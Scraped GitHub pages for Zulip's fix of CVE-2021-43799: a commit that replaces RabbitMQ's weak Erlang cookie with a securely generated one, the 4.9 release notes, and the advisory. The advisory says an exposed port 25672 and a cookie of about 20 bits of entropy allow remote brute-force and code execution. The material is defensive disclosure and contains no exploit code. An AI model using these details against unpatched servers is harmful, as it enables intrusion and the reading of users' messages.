   21.9k](/login?return_to=%2Fzulip%2Fzulip)

* [Code](/zulip/zulip)
* [Issues
  1.6k](/zulip/zulip/issues)
* [Pull requests
  885](/zulip/zulip/pulls)
* [Actions](/zulip/zulip/actions)
* [Projects
  2](/zulip/zulip/projects)
* [Security](/zulip/zulip/security)
* [Insights](/zulip/zulip/pulse)

Additional navigation options

* [Code](/zulip/zulip)
* [Issues](/zulip/zulip/issues)
* [Pull requests](/zulip/zulip/pulls)
* [Actions](/zulip/zulip/actions)
* [Projects](/zulip/zulip/projects)
* [Security](/zulip/zulip/security)
* [Insights](/zulip/zulip/pulse)

## Commit

[Permalink](/zulip/zulip/commit/a5496f4098e3998c9b84e8dc564aa983d6cdf6e8)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

CVE-2021-43799: Set a secure Erlang cookie.

[Browse files](/zulip/zulip/tree/a5496f4098e3998c9b84e8dc564aa983d6cdf6e8)
Browse the repository at this point in the history

```
The RabbitMQ docs state ([1]):

    RabbitMQ nodes and CLI tools (e.g. rabbitmqctl) use a cookie to
    determine whether they are allowed to communicate with each
    other. [...] The cookie is just a string of alphanumeric
    characters up to 255 characters in size. It is usually stored in a
    local file.

...and goes on to state (emphasis ours):

    If the file does not exist, Erlang VM will try to create one with
    a randomly generated value when the RabbitMQ server starts
    up. Using such generated cookie files are **appropriate in
    development environments only.**

The auto-generated cookie does not use cryptographic sources of
randomness, and generates 20 characters of `[A-Z]`.  Because of a
semi-predictable seed, the entropy of this password is thus less than
the idealized 26^20 = 94 bits of entropy; in actuality, it is 36 bits
of entropy, or potentially as low as 20 if the performance of the
server is known.

These sizes are well within the scope of remote brute-force attacks.

On provision, install, and upgrade, replace the default insecure
20-character Erlang cookie with a cryptographically secure
255-character string (the max length allowed).

[1] <https://www.rabbitmq.com/clustering.html#erlang-cookie>
```

* Loading branch information

[![@alexmv](https://avatars.githubusercontent.com/u/28347?s=40&v=4)](/alexmv)

[alexmv](/zulip/zulip/commits?author=alexmv "View all commits by alexmv")
committed
Jan 25, 2022

1 parent
[93a344f](/zulip/zulip/commit/93a344fc3c24eb6ebb04182c8f53a6bcf5a9adf9)

commit a5496f4

 Show file tree

 Hide file tree

Showing
**4 changed files**
with
**61 additions**
and
**3 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* docs/overview

  + docs/overview/changelog.md
    [changelog.md](#diff-09edb1cb3a669b569016c126bdfacbbf114adcc7578978089c7a2179a5dd68b1)
* scripts

  + lib

    - scripts/lib/upgrade-zulip-stage-2
      [upgrade-zulip-stage-2](#diff-f5ef461ef8d3ae752d981d7a502181f66b15a327f4c7aee68a14b8499e6d1ef1)
  + setup

    - scripts/setup/configure-rabbitmq
      [configure-rabbitmq](#diff-08ea4a91a3f8bb0c7d6b59a7dd156cd48495df31f94b7c9108aea389b6be6fa8)
    - scripts/setup/generate-rabbitmq-cookie
      [generate-rabbitmq-cookie](#diff-8bae6fa060c43f72bec457c8831ef6074e5a02dc0656fc37e162fdcc161f823d)

## There are no files selected for viewing

1 change: 1 addition & 0 deletions

1
[docs/overview/changelog.md](#diff-09edb1cb3a669b569016c126bdfacbbf114adcc7578978089c7a2179a5dd68b1 "docs/overview/changelog.md")

Show comments

[View file](/zulip/zulip/blob/a5496f4098e3998c9b84e8dc564aa983d6cdf6e8/docs/overview/changelog.md)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

| Expand Up | | @@ -121,6 +121,7 @@ log][commit-log] for an up-to-date list of raw changes. |
|  |  |  |
|  |  | ## Zulip 4.x series |
|  |  |  |
|  |  | - CVE-2021-43799: Remote execution of code involving RabbitMQ. |
|  |  | - Closed access to RabbitMQ port 25672; initial installs tried to |
|  |  | close this port, but failed to restart RabbitMQ for the |
|  |  | configuration. |
| Expand Down | |  |

32 changes: 29 additions & 3 deletions

32
[scripts/lib/upgrade-zulip-stage-2](#diff-f5ef461ef8d3ae752d981d7a502181f66b15a327f4c7aee68a14b8499e6d1ef1 "scripts/lib/upgrade-zulip-stage-2")

Show comments

[View file](/zulip/zulip/blob/a5496f4098e3998c9b84e8dc564aa983d6cdf6e8/scripts/lib/upgrade-zulip-stage-2)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -13,7 +13,7 @@ import re |
|  |  | import subprocess |
|  |  | import sys |
|  |  | import time |
|  |  | from typing import TYPE\_CHECKING |
|  |  | from typing import TYPE\_CHECKING, Optional |
|  |  |  |
|  |  | if TYPE\_CHECKING: |
|  |  | from typing import NoReturn |
| Expand Down  Expand Up | | @@ -116,15 +116,31 @@ IS\_SERVER\_UP = True |
|  |  |  |
|  |  | # Check if rabbitmq port 25672 is listening on anything except 127.0.0.1 |
|  |  | rabbitmq\_dist\_listen = listening\_publicly(25672) |
|  |  | # Check the erlang magic cookie size |
|  |  | cookie\_size: Optional[int] = None |
|  |  | if os.path.exists("/var/lib/rabbitmq/.erlang.cookie"): |
|  |  | with open("/var/lib/rabbitmq/.erlang.cookie", "r") as cookie\_fh: |
|  |  | cookie\_size = len(cookie\_fh.readline()) |
|  |  | else: |
|  |  | logging.info("No RabbitMQ erlang cookie found, not auditing RabbitMQ security.") |
|  |  | if args.skip\_puppet and rabbitmq\_dist\_listen: |
|  |  | logging.error( |
|  |  | "RabbitMQ is publicly-accessible on %s; this is a security vulnerability!", |
|  |  | ", ".join(rabbitmq\_dist\_listen), |
|  |  | ) |
|  |  | issue = "issue" |
|  |  | if cookie\_size is not None and cookie\_size == 20: |
|  |  | # See the below comment -- this is used as a lightweight |
|  |  | # signal for a cookie made with Erlang's bad randomizer. |
|  |  | logging.error( |
|  |  | "RabbitMQ erlang cookie is insecure; this is a critical security vulnerability!" |
|  |  | ) |
|  |  | issue = "issues" |
|  |  | logging.error( |
|  |  | "To fix the above security issue, re-run the upgrade without --skip-puppet " |
|  |  | "To fix the above security %s, re-run the upgrade without --skip-puppet " |
|  |  | "(which may be set in /etc/zulip/zulip.conf), in order to restart the " |
|  |  | "necessary services. Running zulip-puppet-apply by itself is not sufficient." |
|  |  | "necessary services. Running zulip-puppet-apply by itself is not sufficient.", |
|  |  | issue, |
|  |  | ) |
|  |  | sys.exit(1) |
|  |  |  |
| Expand Down  Expand Up | | @@ -304,6 +320,16 @@ if rabbitmq\_dist\_listen: |
|  |  | logging.info("Shutting down rabbitmq to adjust its ports...") |
|  |  | subprocess.check\_call(["/usr/sbin/service", "rabbitmq-server", "stop"]) |
|  |  |  |
|  |  | if cookie\_size is not None and cookie\_size == 20: |
|  |  | # Checking for a 20-character cookie is used as a signal that it |
|  |  | # was generated by Erlang's insecure randomizer, which only |
|  |  | # provides between 20 and 36 bits of entropy; were it 20 |
|  |  | # characters long by a good randomizer, it would be 96 bits and |
|  |  | # more than sufficient. We generate, using good randomness, a |
|  |  | # 255-character cookie, the max allowed length. |
|  |  | logging.info("Generating a secure erlang cookie...") |
|  |  | subprocess.check\_call(["./scripts/setup/generate-rabbitmq-cookie"]) |
|  |  |  |
|  |  | # Adjust Puppet class names for the manifest renames in the 4.0 release |
|  |  | class\_renames = { |
|  |  | "zulip::app\_frontend": "zulip::profile::app\_frontend", |
| Expand Down | |  |

4 changes: 4 additions & 0 deletions

4
[scripts/setup/configure-rabbitmq](#diff-08ea4a91a3f8bb0c7d6b59a7dd156cd48495df31f94b7c9108aea389b6be6fa8 "scripts/setup/configure-rabbitmq")

Show comments

[View file](/zulip/zulip/blob/a5496f4098e3998c9b84e8dc564aa983d6cdf6e8/scripts/setup/configure-rabbitmq)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -10,6 +10,10 @@ else |
|  |  | sudo=(sudo) |
|  |  | fi |
|  |  |  |
|  |  | # If the RabbitMQ distribution cookie is insecure, reset it and |
|  |  | # restart RabbitMQ. |
|  |  | "${sudo[@]}" "$(dirname "$0")/generate-rabbitmq-cookie" |
|  |  |  |
|  |  | RABBITMQ\_USERNAME=$("$(dirname "$0")/../get-django-setting" RABBITMQ\_USERNAME) |
|  |  | RABBITMQ\_PASSWORD=$("$(dirname "$0")/../get-django-setting" RABBITMQ\_PASSWORD) |
|  |  |  |
| Expand Down | |  |

27 changes: 27 additions & 0 deletions

27
[scripts/setup/generate-rabbitmq-cookie](#diff-8bae6fa060c43f72bec457c8831ef6074e5a02dc0656fc37e162fdcc161f823d "scripts/setup/generate-rabbitmq-cookie")

Show comments

[View file](/zulip/zulip/blob/a5496f4098e3998c9b84e8dc564aa983d6cdf6e8/scripts/setup/generate-rabbitmq-cookie)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,27 @@ |
|  |  | #!/usr/bin/env bash |
|  |  | # |
|  |  | # rabbitmq sets an insecure "magic cookie" which is used for auth; |
|  |  | # reset it to be longer. |
|  |  | set -eu |
|  |  |  |
|  |  | cookiefile=/var/lib/rabbitmq/.erlang.cookie |
|  |  | # If the RabbitMQ distribution cookie is insecure, reset it |
|  |  | if [ ! -f "$cookiefile" ] || ! size="$(wc -c "$cookiefile")" || [ "${size%% \*}" -le 20 ]; then |
|  |  | running=0 |
|  |  | if service rabbitmq-server status >/dev/null; then |
|  |  | running=1 |
|  |  | service rabbitmq-server stop |
|  |  | fi |
|  |  |  |
|  |  | echo "Setting a more secure RabbitMQ distribution magic cookie" |
|  |  | cookie="$(LC\_ALL=C tr -dc '[:alnum:]' </dev/urandom | head -c255)" |
|  |  | [ "${#cookie}" -eq 255 ] # make sure tr wasn’t OOM-killed |
|  |  | tmpfile="$(mktemp "$cookiefile.XXXXXXXXXX")" |
|  |  | chown rabbitmq: "$tmpfile" |
|  |  | printf '%s' "$cookie" >"$tmpfile" |
|  |  | mv "$tmpfile" "$cookiefile" |
|  |  |  |
|  |  | if [ "$running" == "1" ]; then |
|  |  | service rabbitmq-server start |
|  |  | fi |
|  |  | fi |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `a5496f4`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fzulip%2Fzulip%2Fcommit%2Fa5496f4098e3998c9b84e8dc564aa983d6cdf6e8) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_d340a7fc_20250108_114129.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fzulip%2Fzulip%2Freleases%2Ftag%2F4.9)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fzulip%2Fzulip%2Freleases%2Ftag%2F4.9)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=zulip%2Fzulip)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[zulip](/zulip)
/
**[zulip](/zulip/zulip)**
Public

* [Notifications](/login?return_to=%2Fzulip%2Fzulip) You must be signed in to change notification settings
* [Fork
  8.1k](/login?return_to=%2Fzulip%2Fzulip)
* [Star
   21.9k](/login?return_to=%2Fzulip%2Fzulip)

* [Code](/zulip/zulip/tree/4.9)
* [Issues
  1.6k](/zulip/zulip/issues)
* [Pull requests
  885](/zulip/zulip/pulls)
* [Actions](/zulip/zulip/actions)
* [Projects
  2](/zulip/zulip/projects)
* [Security](/zulip/zulip/security)
* [Insights](/zulip/zulip/pulse)

Additional navigation options

* [Code](/zulip/zulip/tree/4.9)
* [Issues](/zulip/zulip/issues)
* [Pull requests](/zulip/zulip/pulls)
* [Actions](/zulip/zulip/actions)
* [Projects](/zulip/zulip/projects)
* [Security](/zulip/zulip/security)
* [Insights](/zulip/zulip/pulse)

1. [Releases](/zulip/zulip/releases)
2. [4.9](/zulip/zulip/releases/tag/4.9)

# Zulip Server 4.9

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/zulip/zulip/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...4.9)

 Loading

[View all tags](/zulip/zulip/tags)

![@alexmv](https://avatars.githubusercontent.com/u/28347?s=40&v=4)
[alexmv](/alexmv)
released this
25 Jan 02:30

·
[20058 commits](/zulip/zulip/compare/4.9...main)
to main
since this release

[4.9](/zulip/zulip/tree/4.9)

[`0213b81`](/zulip/zulip/commit/0213b811ec6cd0edce84d1f39c0e2d6c2ffa6768)

* CVE-2021-43799: Remote execution of code involving RabbitMQ.
* Closed access to RabbitMQ port 25672; initial installs tried to

  close this port, but failed to restart RabbitMQ for the

  configuration.
* Removed the `rabbitmq.nodename` configuration in `zulip.conf`; all

  RabbitMQ instances will be reconfigured to have a nodename of

  `zulip@localhost`. You can remove this setting from your

  `zulip.conf` configuration file, if it exists.
* Added missing support for the Camo image proxy in the Docker

  image. This resolves a longstanding issue with image previews, if

  enabled, appearing as broken images for Docker-based installs.
* Fixed a bug which allowed a user to edit a message to add a wildcard

  mention when they did not have permissions to send such messages

  originally.
* Fixed a bug in the tool that corrects database corruption caused by

  updating the operating system hosting PostgreSQL, which previously

  omitted some indexes from its verification. If you updated the

  operating system of your Zulip instance from Ubuntu 18.04 to 20.04,

  or from Debian Stretch to Debian Buster, you should run the tool,

  even if you did so previously; full details and instructions are

  available in the previous blog post.
* Began routing requests from the Camo image proxy through a

  non-Smokescreen proxy, if one is configured; because Camo includes

  logic to deny access to private subnets, routing its requests

  through Smokescreen is generally not necessary.
* Fixed a bug where changing the Camo secret required running

  `zulip-puppet-apply`.
* Fixed `scripts/setup/compare-settings-to-template` to be able to run

  from any directory.
* Switched Let's Encrypt renewal to use its own timer, rather than our

  custom cron job. This fixes a bug where occasionally `nginx` would

  not reload after getting an updated certificate.
* Updated documentation and tooling to note that installs using

  `upgrade-zulip-from-git` require 3 GB of RAM, or 2 GB and at least 1

  GB of swap.

 Assets
3

 Loading

 👍
2
 ufoo4 and madrix01 reacted with thumbs up emoji

All reactions

* 👍
  2 reactions

 2 people reacted

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_69c5fe36_20250108_114130.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fzulip%2Fzulip%2Fsecurity%2Fadvisories%2FGHSA-p663-wxvv-2fjp)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fzulip%2Fzulip%2Fsecurity%2Fadvisories%2FGHSA-p663-wxvv-2fjp)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=zulip%2Fzulip)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[zulip](/zulip)
/
**[zulip](/zulip/zulip)**
Public

* [Notifications](/login?return_to=%2Fzulip%2Fzulip) You must be signed in to change notification settings
* [Fork
  8.1k](/login?return_to=%2Fzulip%2Fzulip)
* [Star
   21.9k](/login?return_to=%2Fzulip%2Fzulip)

* [Code](/zulip/zulip)
* [Issues
  1.6k](/zulip/zulip/issues)
* [Pull requests
  885](/zulip/zulip/pulls)
* [Actions](/zulip/zulip/actions)
* [Projects
  2](/zulip/zulip/projects)
* [Security](/zulip/zulip/security)
* [Insights](/zulip/zulip/pulse)

Additional navigation options

* [Code](/zulip/zulip)
* [Issues](/zulip/zulip/issues)
* [Pull requests](/zulip/zulip/pulls)
* [Actions](/zulip/zulip/actions)
* [Projects](/zulip/zulip/projects)
* [Security](/zulip/zulip/security)
* [Insights](/zulip/zulip/pulse)

# RabbitMQ exposes ports with weak default secrets

High

[alexmv](/alexmv)
published
GHSA-p663-wxvv-2fjp
Jan 25, 2022

## Package

Zulip Server
(Application)

## Affected versions

< 4.9

## Patched versions

4.9

## Description

### Impact

Zulip Server installs RabbitMQ for internal message passing. In all affected versions of Zulip Server, the initial installation (until first reboot, or restart of RabbitMQ) does not successfully limit the default ports which RabbitMQ opens; this includes port 25672, the RabbitMQ distribution port, which used for inter-node communication in clustered environments, as well as a local management port. RabbitMQ's default "cookie" which protects this port is generated using a weak PRNG, which limits the entropy of the password to at most 36 bits; in practicality, the seed for the randomizer is biased, resulting in approximately 20 bits of entropy.

If other firewalls (at the OS or network level) do not protect port 25672, a remote attacker can brute-force the 20 bits of entropy in the "cookie" and leverage it for arbitrary execution of code as the rabbitmq user. They can also read all data which is sent through RabbitMQ, which includes all message traffic sent by users.

### Patches

This issue is fixed in Zulip 4.9.

### Workarounds

Any of the following, though we strongly suggest all:

1. Ensure that firewalls prevent access to port 25672 from outside the Zulip server
2. Restart the `rabbitmq-server` service
3. Stop `rabbitmq-server`, generate a new secure Erlang magic cookie in `/var/lib/rabbitmq/.erlang.cookie`, and restart `rabbitmq-server`

### References

(Zulip Blog post)

### For more information

If you have any questions or comments about this advisory, you can discuss them on the [developer community Zulip server](https://zulip.com/developer-community/), or email the Zulip security team.

### Severity

High

8.6

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Changed

Confidentiality
High

Integrity
None

Availability
None

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N

### CVE ID

CVE-2021-43799

### Weaknesses

[CWE-338](/advisories?query=cwe%3A338)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


